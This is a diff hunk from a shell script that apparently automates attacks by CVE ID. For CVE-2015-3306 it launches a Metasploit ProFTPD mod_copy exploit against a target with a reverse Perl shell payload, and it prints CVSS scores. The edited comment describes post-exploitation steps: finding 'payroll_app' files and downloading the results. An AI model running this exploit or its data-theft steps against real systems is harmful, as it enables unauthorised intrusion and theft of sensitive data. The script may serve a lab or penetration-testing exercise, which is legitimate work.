@@ -11,9 +11,9 @@ then
 elif [ $ATTACK == "CVE-2015-3306" ]
 then
 	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; exit; " 
-	# in command shell run "locate payroll_app >> results.txt" and then "download results.txt \root"
-	echo "baseScore_V2: 10" 
-	echo "severity_V2: HIGH"  
+	# in command shell run locate payroll_app. >> results.txt and then download results.txt \results.txt
+	echo "baseScore_V2: 10"
+	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
